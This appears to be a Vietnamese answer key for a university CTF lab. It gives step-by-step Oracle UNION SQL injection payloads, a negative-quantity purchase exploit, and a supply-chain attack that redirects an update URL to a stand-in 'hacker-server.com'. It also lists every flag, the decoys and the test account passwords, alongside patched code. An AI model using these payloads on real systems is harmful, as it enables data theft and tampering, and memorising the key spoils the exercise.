# 🔐 ANSWER KEY – DBS401 Group 02 (NỘI BỘ – KHÔNG NỘP CÔNG KHAI)

> Chỉ dùng trong lab CTF DBS401 nội bộ. Không chia sẻ trước khi thi/demo.

---

## 🚩 FLAG MASTER LIST

| Flag | Giá trị | Vị trí |
|------|---------|---------|
| Flag 1 | `DBS401{SQL_1nj3ct10n_0r4cl3!}` | `search.php` (SQLi) |
| Flag 2 | `DBS401{LOGIC_GURU_2024}` | `store.php` (Business Logic) |
| Flag 3 | `DBS401{5upp1y_Ch41n_P0150n1ng_0912}` | `admin.php` (Supply Chain) |

## 🎭 FAKE FLAG LIST (để không bị nhầm)

| Fake Flag | Vị trí | Mục đích |
|-----------|--------|----------|
| `DBS401{FAKE_union_select_lol}` | FAKE_FLAGS table | Bẫy người mới dùng UNION đơn giản |
| `DBS401{FAKE_IDOR_wrong_student}` | FAKE_FLAGS table + decoy enrollment | Bẫy người tìm sai student ID |
| `DBS401{FAKE_blind_wrong_key_xd}` | ADMIN_SECRETS key=oracle_flag_3_backup | Bẫy người dùng sai key (từ kịch bản cũ) |
| `DBS401{FAKE_archived_flag_123}` | FLAG_ARCHIVE table | Bẫy người tìm nhầm bảng |
| `DBS401{FAKE_IDOR_notreal}` | ENROLLMENTS student_id=4 nội bộ note | Bẫy IDOR stage 1 (từ kịch bản cũ) |

---

## ═══════════════════════════════════════════════
## VULNERABILITY 1 – Oracle UNION-Based SQL Injection
## ═══════════════════════════════════════════════

**Mức độ lỗ hổng (DBS401):** Easy  
**Mức độ tìm flag:** Very Hard  
**URL bị lỗi:** `GET /dbs401-oracle-app/search.php?q=KEYWORD`  
**Tài khoản cần:** Bất kỳ (student1, teacher1, admin đều được)

---

### Bước 1 – Xác nhận injection point

```
GET /search.php?q='
```
→ Nếu nhận được `Search failed. Please check your input.` → lỗi SQL được suppress.  
→ Injection tồn tại (không phải "blocked").

```
GET /search.php?q=Software' AND '1'='1
```
→ Trả về kết quả bình thường → injection confirmed.

```
GET /search.php?q=Software' AND '1'='2
```
→ Không có kết quả → boolean behavior works.

---

### Bước 2 – Xác định số cột và kiểu dữ liệu

Query gốc có 3 cột: `student_id (NUMBER)`, `full_name (VARCHAR2)`, `major (VARCHAR2)`

Thử UNION với NULL để xác định:

```sql
' UNION SELECT NULL,NULL,NULL FROM DUAL WHERE '1'='1
```
→ Nếu 3 NULLs cho ra 1 row → query có 3 cột ✓

Kiểm tra kiểu cột:
```sql
' UNION SELECT 1,NULL,NULL FROM DUAL WHERE '1'='1
```
→ Cột 1 là NUMBER (nhận 1 OK)

```sql
' UNION SELECT 1,'test',NULL FROM DUAL WHERE '1'='1
```
→ Cột 2 là VARCHAR2 ✓

---

### Bước 3 – Khám phá Oracle metadata

**Tìm tên DB user:**
```sql
' UNION SELECT 1,USER,NULL FROM DUAL WHERE '1'='1
```
→ Trả về: `DBS401_USER`

**Liệt kê tất cả bảng:**
```sql
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES WHERE ROWNUM<=5 AND '1'='1
```
→ Nhận được: `USERS, STUDENTS, COURSES, ENROLLMENTS, AUDIT_LOGS...`

Tiếp tục enumerate (dùng NOT IN để lấy thêm):
```sql
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES WHERE table_name NOT IN ('USERS','STUDENTS','COURSES','ENROLLMENTS','AUDIT_LOGS') AND ROWNUM<=5 AND '1'='1
```
→ Nhận được: `FLAGS, ADMIN_SECRETS, CONFIG_STORE, FAKE_FLAGS, SYSTEM_HINTS, FLAG_ARCHIVE`

⚠️ `FLAG_ARCHIVE` trông giống bảng flag → **đây là DECOY**!

---

### Bước 4 – Lấy Flag Part A từ FLAGS table

```sql
' UNION SELECT 1,flag_part,flag_code FROM FLAGS WHERE part_order=1 AND is_active=1 AND flag_code='FL1_PART_A' AND ROWNUM=1 AND '1'='1
```
→ Nhận được: `flag_part = 4442533430317B53514C5F`

> **Decode hex:**  
> `4442533430317B53514C5F` → ASCII  
> 44=D, 42=B, 53=S, 34=4, 30=0, 31=1, 7B={, 53=S, 51=Q, 4C=L, 5F=_  
> → **`DBS401{SQL_`**

⚠️ Cũng có `FL_DECOY_B` (is_active=1) → kết quả là chuỗi base64 vô nghĩa → **FAKE!**

---

### Bước 5 – Lấy Flag Part B từ AUDIT_LOGS

```sql
' UNION SELECT log_id,metadata_note,action FROM AUDIT_LOGS WHERE action='SYSTEM_AUDIT_CHECK' AND ROWNUM=1 AND '1'='1
```
→ Nhận được metadata_note:  
`{"sys_version":"v2.1","fragment":"_n01tc3jn1","note":"reverse_for_context","ref":"FLAG_COMPONENT_B"}`

> **Decode:** Trường `fragment` = `_n01tc3jn1`  
> Hint: `reverse_for_context` → đảo ngược chuỗi  
> `_n01tc3jn1` → đảo → **`1nj3ct10n_`**

---

### Bước 6 – Lấy Flag Part C từ CONFIG_STORE

Liệt kê CONFIG_STORE:
```sql
' UNION SELECT 1,config_key,config_value FROM CONFIG_STORE WHERE is_public=0 AND ROWNUM=1 AND '1'='1
```
→ Lấy tiếp tục với NOT IN để tìm tất cả private configs.

Tìm key `sys_alpha_marker`:
```sql
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE WHERE config_key='sys_alpha_marker' AND '1'='1
```
→ Nhận được: `MHI0Y2wzIX0=`

> **Decode base64:** `MHI0Y2wzIX0=` → **`0r4cl3!}`**

⚠️ `sys_beta_marker` có giá trị khác → **FAKE!**

---

### Bước 7 – Ghép Flag 1

```
Part A (hex decode):   DBS401{SQL_
Part B (reverse):      1nj3ct10n_
Part C (base64 decode): 0r4cl3!}

FLAG 1 = DBS401{SQL_ + 1nj3ct10n_ + 0r4cl3!}
       = DBS401{SQL_1nj3ct10n_0r4cl3!}
```

✅ **FLAG 1: `DBS401{SQL_1nj3ct10n_0r4cl3!}`**

---

### Cách vá lỗi

```php
// Vulnerable:
$sql = "... WHERE full_name LIKE '%$keyword%' ...";

// Secure:
$param = '%' . $keyword . '%';
$sql   = "... WHERE full_name LIKE :kw ...";
$stmt  = oci_parse($conn, $sql);
oci_bind_by_name($stmt, ':kw', $param);
oci_execute($stmt);
```

---

## ═══════════════════════════════════════════════
## VULNERABILITY 2 – Insecure Business Logic (Negative Quantity)
## ═══════════════════════════════════════════════

**Mức độ lỗ hổng (DBS401):** Hard  
**Mức độ tìm flag:** Very Hard  
**URL bị lỗi:** `POST /dbs401-oracle-app/store.php`
**Tài khoản cần:** Bất kỳ sinh viên nào (student1, student2,...)

### Bước 1 – Phân tích rào cản tài chính
1. Đăng nhập bằng tài khoản sinh viên (ví dụ: `student1 / Student@123`).
2. Truy cập trang cửa hàng học liệu (`store.php`).
3. Quan sát số dư Credits hiện tại (ví dụ: 150 Credits).
4. Thấy mục "Exam Leak 2024 (CLASSIFIED)" có giá 999,999 Credits, không thể mua được.

### Bước 2 – Khai thác lỗ hổng Business Logic (Negative Quantity)
1. Tìm trường nhập số lượng (`quantity`) cho bất kỳ tài liệu nào (ví dụ: "Advanced Security Guide (PDF)" giá 100 Credits).
2. Nhập một số lượng âm lớn vào trường `quantity` (ví dụ: `-20000`).
3. Nhấn nút "Order" (hoặc "Buy").

**Giải thích:** Hệ thống tính toán `cost = quantity * price`. Nếu `quantity` là `-20000` và `price` là `100`, thì `cost = -2,000,000`. Khi đó, `newCredits = currentCredits - cost` sẽ trở thành `currentCredits - (-2,000,000) = currentCredits + 2,000,000`. Số dư Credits của sinh viên sẽ tăng lên đáng kể.

### Bước 3 – Lấy Flag 2
1. Sau khi số dư Credits đã tăng lên (ví dụ: 2,000,150 Credits), quay lại trang `store.php`.
2. Bây giờ, mục "Exam Leak 2024 (CLASSIFIED)" đã có thể mua được.
3. Nội dung của mục này sẽ hiển thị Flag 2.

✅ **FLAG 2: `DBS401{LOGIC_GURU_2024}`**

### Cách vá lỗi
```php
// Vulnerable – Thiếu kiểm tra giá trị âm cho $qty
$cost = $qty * $price;
if ($credits >= $cost) {
    $newCredits = $credits - $cost;

// Secure – Thêm kiểm tra $qty > 0
if ($qty <= 0) {
    $msg = "Quantity must be a positive number.";
} elseif ($credits >= $cost) {
    $newCredits = $credits - $cost;
    // ...
}
```

---

## ═══════════════════════════════════════════════
## VULNERABILITY 3 – Supply Chain Poisoning (Partner Update)
## ═══════════════════════════════════════════════

**Mức độ lỗ hổng (DBS401):** Hard (Chained Attack)  
**Mức độ tìm flag:** Very Hard  
**URL bị lỗi:** `admin.php` (chức năng "Check for Partner Updates")
**Tài khoản cần:** `admin / Admin@DBS401!2024` (hoặc tài khoản admin đã bị chiếm quyền)

### Bước 1 – Thu thập thông tin (Reconnaissance)
1. Sử dụng lỗ hổng SQL Injection tại `search.php` (Vulnerability 1) để đọc bảng `CONFIG_STORE`.
2. Tìm kiếm các `config_key` có `is_public = 0`.
3. Phát hiện `config_key = 'update_url'` với giá trị mặc định là `http://127.0.0.1:8081/manifest.json`.
4. Phát hiện `config_key = 'app_version'` với giá trị hiện tại là `3.1.0`.

### Bước 2 – Đầu độc Database (Data Manipulation)
1. Sử dụng lỗ hổng SQL Injection (Vulnerability 1) để thực hiện lệnh `UPDATE` vào bảng `CONFIG_STORE`.
2. Thay đổi giá trị của `update_url` thành URL của máy chủ do hacker kiểm soát (ví dụ: `http://hacker-server.com/malicious_manifest.json`).
   Payload ví dụ (chèn vào `search.php?q=`):
   ```sql
   ' UNION SELECT 1, 'a', 'b' FROM DUAL; UPDATE CONFIG_STORE SET config_value='http://hacker-server.com/malicious_manifest.json' WHERE config_key='update_url'; --
   ```
   (Lưu ý: Payload `UPDATE` trong `UNION SELECT` có thể không hoạt động trực tiếp do giới hạn của `oci_execute`. Hacker có thể cần một lỗ hổng khác hoặc quyền admin để thực hiện `UPDATE` này. Tuy nhiên, kịch bản này giả định hacker đã có cách để thay đổi giá trị trong DB).

### Bước 3 – Chuẩn bị Manifest giả mạo trên máy chủ của Hacker
1. Hacker cần tạo một máy chủ web và đặt một file `manifest.json` (hoặc `malicious_manifest.json`) tại URL đã thay đổi.
2. File `manifest.json` này phải có cấu trúc hợp lệ và chứa một `version` **cao hơn** phiên bản hiện tại của ứng dụng (ví dụ: `4.0.0` > `3.1.0`).
3. File này cũng sẽ chứa mảnh Flag 3 (được mã hóa Hex).
   Ví dụ nội dung `malicious_manifest.json`:
   ```json
   {
     "version": "4.0.0",
     "status": "critical_update",
     "checksum": "deadbeef",
     "flag_part": "4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d"
   }
   ```

### Bước 4 – Kích hoạt cuộc tấn công (Triggering the Attack)
1. Đăng nhập vào tài khoản Admin (`admin / Admin@DBS401!2024`).
2. Truy cập trang Admin (`admin.php`).
3. Nhấn nút "Check for Partner Updates" trong phần "System Integrity & Supply Chain".

**Giải thích:** Hệ thống sẽ truy vấn `CONFIG_STORE` để lấy `update_url` (hiện đã trỏ về máy chủ của hacker). Sau đó, nó sẽ tải `manifest.json` từ máy chủ của hacker. Vì `version` trong manifest giả mạo (`4.0.0`) cao hơn `APP_VERSION` hiện tại (`3.1.0`), hệ thống sẽ hiển thị thông báo cập nhật thành công và tiết lộ `flag_part`.

### Bước 5 – Giải mã Flag 3
1. Lấy chuỗi `flag_part` từ kết quả hiển thị trên trang Admin.
   `4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d`
2. Giải mã chuỗi Hex này.
   `4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d` → **`DBS401{5upp1y_Ch41n_P0150n1ng_0912}`**

✅ **FLAG 3: `DBS401{5upp1y_Ch41n_P0150n1ng_0912}`**

### Cách vá lỗi
```php
// Vulnerable – Tin tưởng hoàn toàn vào giá trị lưu trong database
$url = $conf['CONFIG_VALUE'] ?? DEFAULT_UPDATE_URL;
$jsonData = @file_get_contents($url);

// Secure – Whitelisting URL và xác thực chữ ký số
// 1. Whitelist các URL đối tác hợp lệ
$allowedUpdateUrls = ['http://cdn.fpt-partner.net/v3/manifest.json', 'https://api.fpt-partner-cloud.net/v3/updates'];
if (!in_array($url, $allowedUpdateUrls)) {
    $msg = "Update URL is not from an authorized source."; $msgType = "danger";
    // Log cảnh báo
} else {
    // 2. Xác thực chữ ký số của manifest (nếu có)
    // if (!verify_digital_signature($jsonData, $manifest['signature'])) { /* reject */ }
    // ...
}
```

---

## 📸 Screenshots cần chụp khi demo

| STT | Cần chụp gì |
|-----|-------------|
| 1 | `search.php` với payload UNION SELECT (xác nhận injection) |
| 2 | Kết quả query `USER_TABLES` (danh sách bảng) |
| 3 | Kết quả query `FLAGS` → `flag_part` hex |
| 4 | Kết quả query `AUDIT_LOGS` → `fragment` reversed |
| 5 | Kết quả query `CONFIG_STORE` → `base64` value |
| 6 | Python decode + ghép → Flag 1 |
| 7 | `store.php` với số dư Credits thấp |
| 8 | `store.php` với `quantity = -20000` và thông báo Credits tăng |
| 9 | `store.php` với số dư Credits cao và Flag 2 hiển thị |
| 10 | `admin.php` với `update_url` mặc định (có thể dùng SQLi để show) |
| 11 | `admin.php` sau khi nhấn "Check for Partner Updates" (trước khi hack) |
| 12 | `search.php` với payload SQLi `UPDATE CONFIG_STORE` (để đổi `update_url`) |
| 13 | `admin.php` sau khi nhấn "Check for Partner Updates" (sau khi hack) và Flag 3 hiển thị |
| 14 | Secure versions so sánh trước/sau vá |

---

## 🔑 Tài khoản test

| Username | Password | Role |
|----------|----------|------|
| admin | `Admin@DBS401!2024` | admin |
| teacher1 | `Teacher@123` | teacher |
| student1 | `Student@123` | student |
| student2 | `Student@123` | student |
| student3 | `Student@123` | student |

---

*Tài liệu này chỉ dùng nội bộ nhóm DBS401 – Group 02.*
